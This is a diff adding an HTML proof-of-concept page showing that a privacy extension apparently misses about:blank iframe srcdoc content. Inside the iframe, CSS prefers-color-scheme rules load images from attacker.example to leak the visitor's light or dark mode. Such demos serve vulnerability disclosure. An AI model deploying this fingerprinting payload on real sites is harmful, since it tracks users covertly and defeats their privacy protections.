@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>iframePoC</title>
+<style>
+  body {
+    font-family: sans-serif;
+  }
+
+  .info {
+    margin-bottom: 16px;
+  }
+
+  .frame-wrapper {
+    border: 2px dashed #888;
+    padding: 8px;
+  }
+</style>
+</head>
+<body>
+  <p class="info">
+    Open DevTools → Network tab and reload this page.<br>
+    With the extension enabled, top-level CSS should be protected,<br>
+    but the iframe srcdoc below is an about:blank document where
+    the content script is not injected.
+  </p>
+
+  <div class="frame-wrapper">
+    <p><strong>Inner iframe (srcdoc) PoC:</strong></p>
+    <iframe
+      id="poc-iframe"
+      width="500"
+      height="220"
+      srcdoc='
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title> PoC - iframe (srcdoc)</title>
+<style>
+  .probe {
+    width: 120px;
+    height: 120px;
+    margin: 40px;
+    background-color: #ddd;
+    display: inline-block;
+  }
+
+  /* Light mode: send /light */
+  @media (prefers-color-scheme: light) {
+    .probe {
+      background-image: url("https://attacker.example/light");
+    }
+  }
+
+  /* Dark mode: send /dark */
+  @media (prefers-color-scheme: dark) {
+    .probe {
+      background-image: url("https://attacker.example/dark");
+    }
+  }
+</style>
+</head>
+<body>
+  <p>Inside iframe srcdoc: CSS-only prefers-color-scheme fingerprinting.</p>
+  <p>Look at the main page&apos;s Network tab: only one of the two URLs
+     will be requested, depending on system dark/light mode, if the
+     extension does not hook this about:blank context.</p>
+  <div class="probe"></div>
+</body>
+</html>
+'>
+    </iframe>
+  </div>
+</body>
+</html>
